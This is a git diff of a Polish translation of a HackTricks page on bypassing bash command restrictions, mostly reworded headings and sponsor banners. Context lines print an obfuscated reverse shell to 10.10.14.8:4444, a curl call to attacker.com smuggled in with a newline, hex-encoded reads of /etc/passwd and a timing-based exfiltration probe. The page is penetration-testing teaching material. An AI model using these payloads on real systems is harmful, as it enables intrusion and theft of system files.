@@ -2,29 +2,29 @@
 
 <details>
 
-<summary><strong>Nauka hakowania AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary><strong>Zacznij od zera i opanuj hakowanie AWS dzięki</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
 
 Inne sposoby wsparcia HackTricks:
 
 * Jeśli chcesz zobaczyć swoją **firmę reklamowaną w HackTricks** lub **pobrać HackTricks w formacie PDF**, sprawdź [**PLANY SUBSKRYPCYJNE**](https://github.com/sponsors/carlospolop)!
 * Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
 * Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
-* **Dołącz do** 💬 [**Grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
-* **Podziel się swoimi sztuczkami hakowania, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) na GitHubie.
+* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
+* **Podziel się swoimi sztuczkami hakerskimi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) na GitHubie.
 
 </details>
 
-<figure><img src="../../.gitbook/assets/image (45).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>
 
 \
-Użyj [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks), aby łatwo tworzyć i **automatyzować przepływy pracy** zasilane przez najbardziej zaawansowane narzędzia społeczności.\
+Użyj [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) do łatwego tworzenia i **automatyzacji prac** z wykorzystaniem najbardziej zaawansowanych narzędzi społeczności.\
 Otrzymaj Dostęp Dziś:
 
 {% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
 
-## Powszechne Ominięcia Ograniczeń
+## Ominięcia Powszechnych Ograniczeń
 
-### Odwrócony Shell
+### Powłoka Odwrócona
 ```bash
 # Double-Base64 is a great way to avoid bad characters like +, works 99% of the time
 echo "echo $(echo 'bash -i >& /dev/tcp/10.10.14.8/4444 0>&1' | base64 | base64)|ba''se''6''4 -''d|ba''se''64 -''d|b''a''s''h" | sed 's/ /${IFS}/g'
@@ -145,12 +145,12 @@ cat `xxd -r -p <<< 2f6574632f706173737764`
 xxd -r -ps <(echo 2f6574632f706173737764)
 cat `xxd -r -ps <(echo 2f6574632f706173737764)`
 ```
-### Ominięcie ograniczeń IP
+### Ominięcie blokady IP
 ```bash
 # Decimal IPs
 127.0.0.1 == 2130706433
 ```
-### Czasowa eksfiltracja danych
+### Wyciek danych oparty na czasie
 ```bash
 time if [ $(whoami|cut -c 1) == s ]; then sleep 5; fi
 ```
@@ -159,14 +159,14 @@ time if [ $(whoami|cut -c 1) == s ]; then sleep 5; fi
 echo ${LS_COLORS:10:1} #;
 echo ${PATH:0:1} #/
 ```
-### Eksfiltracja danych DNS
+### Przechwytywanie danych DNS
 
 Możesz użyć **burpcollab** lub [**pingb**](http://pingb.in) na przykład.
 
 ### Wbudowane funkcje
 
-W przypadku gdy nie możesz wykonać zewnętrznych funkcji i masz dostęp jedynie do **ograniczonego zestawu wbudowanych funkcji do uzyskania RCE**, istnieją przydatne sztuczki pozwalające to zrobić. Zazwyczaj **nie będziesz mógł użyć wszystkich** wbudowanych funkcji, dlatego powinieneś **znać wszystkie dostępne opcje**, aby próbować ominąć więzienie. Pomysł pochodzi od [**devploit**](https://twitter.com/devploit).\
-Po pierwsze sprawdź wszystkie [**wbudowane funkcje powłoki**](https://www.gnu.org/software/bash/manual/html\_node/Shell-Builtin-Commands.html)**.** Oto kilka **zaleceń**:
+W przypadku gdy nie możesz wykonywać zewnętrznych funkcji i masz dostęp jedynie do **ograniczonego zestawu wbudowanych funkcji do uzyskania RCE**, istnieją przydatne sztuczki pozwalające to zrobić. Zazwyczaj **nie będziesz w stanie użyć wszystkich** wbudowanych funkcji, dlatego powinieneś **znać wszystkie dostępne opcje**, aby spróbować ominąć więzienie. Pomysł pochodzi od [**devploit**](https://twitter.com/devploit).\
+Po pierwsze sprawdź wszystkie [**wbudowane funkcje powłoki**](https://www.gnu.org/software/bash/manual/html\_node/Shell-Builtin-Commands.html)**.** Następnie oto kilka **zaleceń**:
 ```bash
 # Get list of builtins
 declare builtins
@@ -229,13 +229,11 @@ if [ "a" ]; then echo 1; fi # Will print hello!
 1%0a`curl http://attacker.com`
 ```
 ### Bashfuscator
-
-### Bashfuscator
 ```bash
 # From https://github.com/Bashfuscator/Bashfuscator
 ./bashfuscator -c 'cat /etc/passwd'
 ```
-### Uruchamianie kodu zdalnego (RCE) za pomocą 5 znaków
+### RCE z 5 znakami
 ```bash
 # From the Organge Tsai BabyFirst Revenge challenge: https://github.com/orangetw/My-CTF-Web-Challenges#babyfirst-revenge
 #Oragnge Tsai solution
@@ -317,9 +315,9 @@ ln /f*
 'sh x'
 'sh g'
 ```
-## Bypass ochrony przed odczytem/wykonaniem/Distroless
+## Bypass ochrony tylko do odczytu/Noexec/Distroless
 
-Jeśli znajdujesz się w systemie plików z zabezpieczeniami **tylko do odczytu i noexec** lub nawet w kontenerze Distroless, istnieją nadal sposoby na **wykonanie dowolnych binarnych plików, nawet powłoki!:**
+Jeśli znajdujesz się w systemie plików z **ochroną tylko do odczytu i noexec** lub nawet w kontenerze distroless, istnieją nadal sposoby na **wykonanie dowolnych binarnych plików, nawet powłoki!:**
 
 {% content-ref url="bypass-fs-protections-read-only-no-exec-distroless/" %}
 [bypass-fs-protections-read-only-no-exec-distroless](bypass-fs-protections-read-only-no-exec-distroless/)
@@ -338,17 +336,17 @@ Jeśli znajdujesz się w systemie plików z zabezpieczeniami **tylko do odczytu 
 * [https://medium.com/secjuice/web-application-firewall-waf-evasion-techniques-2-125995f3e7b0](https://medium.com/secjuice/web-application-firewall-waf-evasion-techniques-2-125995f3e7b0)
 * [https://www.secjuice.com/web-application-firewall-waf-evasion/](https://www.secjuice.com/web-application-firewall-waf-evasion/)
 
-<figure><img src="../../.gitbook/assets/image (45).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>
 
 \
 Użyj [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks), aby łatwo tworzyć i **automatyzować zadania** przy użyciu najbardziej zaawansowanych narzędzi społeczności.\
-Otrzymaj Dostęp Dziś:
+Zdobądź Dostęp Dziś:
 
 {% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
 
 <details>
 
-<summary><strong>Zacznij od zera i zostań ekspertem AWS hackingu z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary><strong>Dowiedz się, jak hakować AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
 
 Inne sposoby wsparcia HackTricks:
 
